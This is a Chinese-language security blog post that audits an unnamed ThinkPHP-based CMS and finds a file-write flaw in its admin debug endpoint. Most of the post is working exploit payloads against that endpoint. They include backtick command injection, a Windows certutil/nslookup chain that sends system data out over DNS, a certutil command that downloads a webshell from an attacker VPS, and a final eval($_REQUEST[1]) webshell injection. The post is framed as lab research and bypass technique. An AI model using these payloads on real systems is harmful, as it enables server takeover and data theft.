---
title: 某cms代码审计RCE&艰难bypass(思路清奇)
tags: 
  - cms
  - 代码审计
  - bypass
  - php
categories: 代码审计
keywords: 'cms,代码审计,bypass,php'
description: 对某cms进行一次代码审计bypass
cover: https://img0.baidu.com/it/u=751296986,1439230770&fm=253&fmt=auto&app=120&f=JPEG?w=650&h=407
data: 2021-08-05 10:00:00
---

<meta name="referrer" content="no-referrer"/>

> 本文已发布到先知社区：https://xz.aliyun.com/t/9990
>
> 作者：ajie

# 0x01 前言

闲来无事挖挖漏洞，发现一个经过了一些过滤的漏洞，踩了无数的坑，然后冥思苦想了许多方法，终于找到了一个点，使得可以进行命令执行与getshell。这里的漏洞点不值一提，但是因为绕过方法挺好玩的，故在这里分享一下思路，大佬勿喷～
思路不唯一，也希望有其他方法的话，大佬们可以不吝赐教，在评论区留下具体方法，谢谢大家～
# 0x02 代码审计环境
此次代码审计采用的是phpstudy一键式搭建。
phpstudy下载地址：[https://www.xp.cn/download.html](https://www.xp.cn/download.html)
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627971325439-22769cc2-8d3c-41a2-8185-4678214b0b6b.png)
代码审计分析工具：nopad++，seay源代码分析工具
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627971466153-651305cf-f199-4ad4-86c8-9599bda20d95.png#align=left&display=inline&height=486&margin=%5Bobject%2Object%5D&name=image.png&originHeight=972&originWidth=2022&size=139166&status=done&style=none&width=1011)
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627971389181-eb803d39-5a81-48d8-ac70-ffc28257b6da.png#align=left&display=inline&height=571&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1142&originWidth=2388&size=356754&status=done&style=none&width=1194)

# 0x03 开始审计
话不多说，先看一下目录结构，很明显的tp5框架
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627972430124-8e7c7656-9fa6-4359-a4e3-6543904ec4ce.png#align=left&display=inline&height=281&margin=%5Bobject%2Object%5D&name=image.png&originHeight=562&originWidth=956&size=48969&status=done&style=none&width=478)
在\thinkphp\base.php文件中也可以看到对应的tp版本号（5.0.24版本好像有个反序列化，其实也可以尝试一下）
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627972568248-ebb5d28f-a552-4570-92f2-57121b18ba68.png#align=left&display=inline&height=301&margin=%5Bobject%2Object%5D&name=image.png&originHeight=602&originWidth=1238&size=96549&status=done&style=none&width=619)
虽然seay用现有的规则扫描扫出来的漏洞不太准确，但是帮忙定位危险函数还是可以的，所以我一般都会先进行自动审计。
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627972380570-1f206c81-580c-4d1c-bd47-71132c722f9b.png#align=left&display=inline&height=652&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1304&originWidth=2424&size=273863&status=done&style=none&width=1212)
接下来就是一个个漏洞分析了，都点进去看一看。
其实只需要看2点：
1.用户可以控制输入的内容
2.输入的内容被放到危险函数中进行了执行
(需要进行流程跟进的话还是推荐使用phpstorm工具的，我这里因为是在虚拟机中，就简单用了seay和nopad++代替)

# 0x04 漏洞点分析
1、具体我发现这个漏洞是在/app/admin/controller/api.php文件下的debug函数
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627972756885-5eac5c3d-6c8e-46ff-9a13-4914400c87c7.png#align=left&display=inline&height=331&margin=%5Bobject%2Object%5D&name=image.png&originHeight=662&originWidth=1360&size=59767&status=done&style=none&width=680)
```php
public function debug()
    {
        $path = 'app/extra/debug.php';
        $file = include $path; 
        $config = array(
         'name' => input('id'),
        );
        $config = preg_replace("/[?><?]/", '', $config);
        $res = array_merge($file, $config);
        $str = '<?php return [';
        foreach ($res as $key => $value) {
            $str .= '\'' . $key . '\'' . '=>' . '\'' . $value . '\'' . ',';
        }
        $str .= ']; ';
        if (file_put_contents($path, $str)) {
            return json(array('code' => 1, 'msg' => '操作成功'));
        } else {
            return json(array('code' => 0, 'msg' => '操作失败'));
        }
    }
```
在代码第15行通过file_put_contents()函数将id传参的内容写入到app/extra/debug.php文件中。
2、可以看到上面进行了一些过滤，将<>和?替换为空
```php
$config = preg_replace("/[?><?]/", '', $config);
```
3、这里直接将不太清晰，实战演示一下，首先访问后台路径，这里有个debug功能，就是上面debug函数的功能点。
[http://127.0.0.1/index.php/admin/](http://127.0.0.1/index.php/admin/)
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627973358124-c7069db1-627c-4b05-8d15-255493426fee.png#align=left&display=inline&height=378&margin=%5Bobject%2Object%5D&name=image.png&originHeight=756&originWidth=2250&size=114711&status=done&style=none&width=1125)
4、具体使用时发现报错了，那就直接访问对应的函数，路由规则就是/index.php/目录-文件-函数.html?传参=。
这里我传参123进行测试
[http://127.0.0.1/index.php/admin-api-debug.html?id=123](http://127.0.0.1/index.php/admin-api-debug.html?id=123)
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627973462857-ae631d20-59ff-4a98-bb1d-6702c09d8311.png#align=left&display=inline&height=227&margin=%5Bobject%2Object%5D&name=image.png&originHeight=454&originWidth=1120&size=27749&status=done&style=none&width=560)
5、在debug.php文件中可以看到123是放到数组中的值处，而我们可以控制这里的值。
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627973579521-fd2d20ba-4b8c-46b5-9edf-654fb073cfed.png#align=left&display=inline&height=97&margin=%5Bobject%2Object%5D&name=image.png&originHeight=194&originWidth=810&size=11511&status=done&style=none&width=405)
```php
<?php return ['name'=>'123',]; 
```
6、下面讲解我进行绕过的思路以及遇到的坑。
# 0x05 绕过思路
## 第一次踩坑
1、首先，这里因为没有过滤单引号和中括号，所以我们可以手动闭合
```php
payload:
http://127.0.0.1/index.php/admin-api-debug.html?id=123%27];phpinfo();//
```
这里可以看到数据是成功写入进文件中的
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627973910607-7d1ffe2f-30b8-406c-9ec6-a7f233aa1838.png#align=left&display=inline&height=131&margin=%5Bobject%2Object%5D&name=image.png&originHeight=262&originWidth=1138&size=17735&status=done&style=none&width=569)
```php
<?php return ['name'=>'123'];phpinfo();//',]; 
```
2、访问debug.php文件试试发现，页面并没有返回想要的内容
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627973998766-06dfe807-2a84-4b08-9d12-f6f666c5d553.png#align=left&display=inline&height=363&margin=%5Bobject%2Object%5D&name=image.png&originHeight=726&originWidth=1882&size=36793&status=done&style=none&width=941)
3、这里我想了好久，想着试试更换echo输出看看
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627974252476-7716d00d-14a0-4716-b201-a544a6f60a7b.png#align=left&display=inline&height=131&margin=%5Bobject%2Object%5D&name=image.png&originHeight=262&originWidth=1216&size=17745&status=done&style=none&width=608)
```php
<?php return ['name'=>'123'];echo '12344321';//',]; 
```
在页面中并没有输出
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627974272002-aae9ec72-7aef-4da2-9334-3b1d52dd1fdc.png#align=left&display=inline&height=349&margin=%5Bobject%2Object%5D&name=image.png&originHeight=698&originWidth=1572&size=32195&status=done&style=none&width=786)
4、查阅资料之后理解了return后代码不再向下执行，此路不通
参考链接：[https://www.cnblogs.com/gzpu/p/13736420.html](https://www.cnblogs.com/gzpu/p/13736420.html)
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627974368673-8697062b-c811-4893-8104-93859af43ce4.png#align=left&display=inline&height=360&margin=%5Bobject%2Object%5D&name=image.png&originHeight=720&originWidth=1780&size=173801&status=done&style=none&width=890)
## 第二次踩坑
1、既然不能通过分号结束代码后执行其他代码的话，我能不能在return中执行代码呢，此处进行了尝试
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627974559232-6d36dadf-930e-47a1-9480-1ec1a7fedfff.png#align=left&display=inline&height=166&margin=%5Bobject%2Object%5D&name=image.png&originHeight=332&originWidth=1320&size=21063&status=done&style=none&width=660)
```php
<?php return ['name'=>'123',eval($_REQUEST[1]);'',]; 
```
于是……页面报错了
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627974695282-85560a7a-e2ed-420b-a587-3fca009fce13.png#align=left&display=inline&height=208&margin=%5Bobject%2Object%5D&name=image.png&originHeight=416&originWidth=1896&size=51008&status=done&style=none&width=948)
2、再试试换行
```php
http://127.0.0.1/index.php/admin-api-debug.html?id=123%27,%0aeval($_REQUEST[1]);%27
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627974633748-97685352-f49d-473f-8a3b-2bee5cd0f9f9.png#align=left&display=inline&height=255&margin=%5Bobject%2Object%5D&name=image.png&originHeight=510&originWidth=1766&size=41682&status=done&style=none&width=883)
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627974665241-8ade3301-0ef4-4c8e-81c7-ed35aaf695d6.png#align=left&display=inline&height=149&margin=%5Bobject%2Object%5D&name=image.png&originHeight=298&originWidth=774&size=17721&status=done&style=none&width=387)
好的，还是不执行
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627974689654-d9f1edad-993c-47cf-bd87-4a90e81ca765.png#align=left&display=inline&height=208&margin=%5Bobject%2Object%5D&name=image.png&originHeight=416&originWidth=1896&size=51008&status=done&style=none&width=948)
## 第三次，渐渐好起来了
1、因为代码执行行不通，那我就想着试试命令执行看可不可以。先申请一个dnslog，链接：[http://dnslog.cn/](http://dnslog.cn/)
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627975381688-d15ad1b7-76f1-415d-bcd7-e22aa5ba1eb6.png#align=left&display=inline&height=368&margin=%5Bobject%2Object%5D&name=image.png&originHeight=736&originWidth=1678&size=96742&status=done&style=none&width=839)
2、使用.拼接反引号执行命令
```php
http://127.0.0.1/index.php/admin-api-debug.html?id=123%27].`ping%20123.yh6nta.dnslog.cn`;//
```
查看文件情况
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627975963563-5fcf69e0-c0a5-4b5c-a539-91dc15f8ed2b.png#align=left&display=inline&height=130&margin=%5Bobject%2Object%5D&name=image.png&originHeight=260&originWidth=1520&size=21022&status=done&style=none&width=760)
```php
<?php return ['name'=>'123'].`ping 123.yh6nta.dnslog.cn`;//',]; 
```
访问看看，发现报错了，但是dnslog记录了数据，命令执行成功了
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627975999637-a25ee21b-1180-4e35-b011-5cfd6aa1b280.png#align=left&display=inline&height=205&margin=%5Bobject%2Object%5D&name=image.png&originHeight=410&originWidth=1638&size=42918&status=done&style=none&width=819)
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627976022017-93c02bcb-6de0-4975-9a73-97abf75fcd0d.png#align=left&display=inline&height=243&margin=%5Bobject%2Object%5D&name=image.png&originHeight=486&originWidth=1562&size=52679&status=done&style=none&width=781)


3、这里报错怀疑是使用了点进行拼接，两边的字符类型不匹配，因为命令执行可以使用符号进行连接，所以在这里将点替换成&。
因为&在url中还有其他含义，所以先进行url编码。
```php
123']&`ping 123.yh6nta.dnslog.cn`;//
#url编码
123%27%5D%26%60ping%20123.yh6nta.dnslog.cn%60%3B%2F%2F
```
```php
http://127.0.0.1/index.php/admin-api-debug.html?id=123%27%5D%26%60ping%20123.yh6nta.dnslog.cn%60%3B%2F%2F
```
查看文件情况
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627976148195-6af4632a-25e2-4522-b675-1534d18406cb.png#align=left&display=inline&height=157&margin=%5Bobject%2Object%5D&name=image.png&originHeight=314&originWidth=1460&size=22879&status=done&style=none&width=730)
```php
<?php return ['name'=>'123']&`ping 123.yh6nta.dnslog.cn`;//',]; 
```
访问debug.php文件，页面没有报错，而且dnslog成功回显
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627976190829-597fc4be-908f-4c66-a852-bdc93422099e.png#align=left&display=inline&height=212&margin=%5Bobject%2Object%5D&name=image.png&originHeight=424&originWidth=1048&size=19358&status=done&style=none&width=524)
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627976225056-8a0f56dd-89e0-44fd-8bda-f6c928a1ffb3.png#align=left&display=inline&height=324&margin=%5Bobject%2Object%5D&name=image.png&originHeight=648&originWidth=1636&size=71050&status=done&style=none&width=818)
4、既然可以执行命令了，很明显这里是无回显的情况，那么怎么拿到shell呢
PHP无回显情况下的渗透测试可以参考此文章：
[https://xz.aliyun.com/t/9916](https://xz.aliyun.com/t/9916)
### Linux系统
```php
这里不细说，只要命令没有<、>、?即可
1、nc反弹shell
2、配合其他组件，如redis等
3、等等～
```
### Windows系统
#### 1、第一次尝试
```php
使用`ping `whoami`.yh6nta.dnslog.cn`，失败
使用`ping /`whoami/`.yh6nta.dnslog.cn`，失败
使用`ping %系统变量%.yh6nta.dnslog.cn`，失败
```
#### 2、第二次尝试
使用系统命令外带数据，首先我在文件中直接修改，发现可以成功外带数据
```php
<?php return ['name'=>'123']&`cmd /c whoami > temp && certutil -encode -f temp temp&&FOR /F "eol=- delims=" %i IN (temp) DO (set _=%i & cmd /c nslookup %_:~0,-1%.yh6nta.dnslog.cn)&del temp`;//',]; 
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627977290414-50582704-a650-4082-a41a-cf9a1665b9b9.png#align=left&display=inline&height=207&margin=%5Bobject%2Object%5D&name=image.png&originHeight=414&originWidth=1540&size=39360&status=done&style=none&width=770)
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627977306573-d1cd453b-5141-4d0b-9168-b691f744965b.png#align=left&display=inline&height=146&margin=%5Bobject%2Object%5D&name=image.png&originHeight=292&originWidth=1470&size=47685&status=done&style=none&width=735)
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627977330429-234914f7-3549-4c6c-a3b9-6167a5649897.png#align=left&display=inline&height=338&margin=%5Bobject%2Object%5D&name=image.png&originHeight=676&originWidth=1130&size=61783&status=done&style=none&width=565)
后面发现，这条命令中含有一个>号，苦恼好久，暂时放弃。不过我觉得这个命令可以适当优化，然后就可以使用了。
#### 3、第三次尝试，成功getshell
这里借鉴了XX师傅的建议，通过命令下载文件getshell


1、首先需要准备一个文件，内容为一句话木马，放到vps的web服务中。（当然起一个python的http服务也可以，主要是要可以访问获取。）


2、windows中可以使用certutil下载文件
```php
#payload：
']&`certutil -urlcache -split -f http://vps地址:83/shell 1.php`;//
#url编码：
%27%5D%26%60certutil%20-urlcache%20-split%20-f%20http%3A%2F%2Fvps地址%3A83%2Fshell%201.php%60%3B%2F%2F
#通过id传参：
http://127.0.0.1/index.php/admin-api-debug.html?id=%27%5D%26%60certutil%20-urlcache%20-split%20-f%20http%3A%2F%2Fvps地址%3A83%2Fshell%201.php%60%3B%2F%2F
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627977842733-531b6b12-9c1d-437f-b7eb-43c9f4d2f586.png#align=left&display=inline&height=324&margin=%5Bobject%2Object%5D&name=image.png&originHeight=648&originWidth=1924&size=52188&status=done&style=none&width=962)
3、查看debug.php文件情况
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627977879453-9011b19e-b726-40d9-8d0b-d2f3f11814b6.png#align=left&display=inline&height=170&margin=%5Bobject%2Object%5D&name=image.png&originHeight=340&originWidth=1370&size=27921&status=done&style=none&width=685)
4、访问debug.php后，会在当前目录生成1.php，内容为一句话木马
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627978056537-80fdfb3f-2da0-4272-86ce-13fc3301fe3c.png#align=left&display=inline&height=270&margin=%5Bobject%2Object%5D&name=image.png&originHeight=540&originWidth=1340&size=52951&status=done&style=none&width=670)
5、执行phpinfo函数
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627978130967-fe3d3a57-3439-4ae1-93af-1f1c0df55acb.png#align=left&display=inline&height=423&margin=%5Bobject%2Object%5D&name=image.png&originHeight=846&originWidth=2230&size=218961&status=done&style=none&width=1115)


## 原来竟然如此简单？
1、因为前面命令执行可以使用符号进行连接，我想着在代码中也试试，看看能不能直接执行一句话木马（测试了｜、｜｜、&、&&，只有&和&&的时候可以执行）
同样先进行url编码
```php
123']&&eval($_REQUEST[1]);//
#url编码
123%27%5D%26%26eval(%24_REQUEST%5B1%5D)%3B%2F%2F
```
```php
http://127.0.0.1/index.php/admin-api-debug.html?id=123%27%5D%26%26eval(%24_REQUEST%5B1%5D)%3B%2F%2F
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627974884495-55623576-d417-48df-b872-bf0ba605d607.png#align=left&display=inline&height=248&margin=%5Bobject%2Object%5D&name=image.png&originHeight=496&originWidth=1940&size=47452&status=done&style=none&width=970)
在文件中是这样的
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627974919229-adbc9a6d-0ff1-4971-96e4-a0a08b7064a5.png#align=left&display=inline&height=123&margin=%5Bobject%2Object%5D&name=image.png&originHeight=246&originWidth=1288&size=19624&status=done&style=none&width=644)
```php
<?php return ['name'=>'123']&&eval($_REQUEST[1]);//',]; 
```
尝试访问，成功执行代码
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627974971491-f1514597-7cb7-43ac-a727-8c191adf1d0e.png#align=left&display=inline&height=497&margin=%5Bobject%2Object%5D&name=image.png&originHeight=994&originWidth=2474&size=252996&status=done&style=none&width=1237)
居然就这样就可以了……
# 0x06 总结
本次代码审计发现漏洞很快，但是利用起来整了我2天，还是在师傅们的帮助下完成的深入利用。忽然发现自己对于编程语言的基础还很不扎实，一些简单处理的地方居然思考了那么久，在之前发现漏洞的情况下，一般都是可以直接利用了，此次bypass的时候发现了很多不足。在以后的代码审计中，简单利用的漏洞只会越来越少，我还需要多深入学习代码知识，才能从一些过滤薄弱点出发，发现漏洞。嗯嗯，总结一句话，不论是学什么东西，基础很重要很重要！
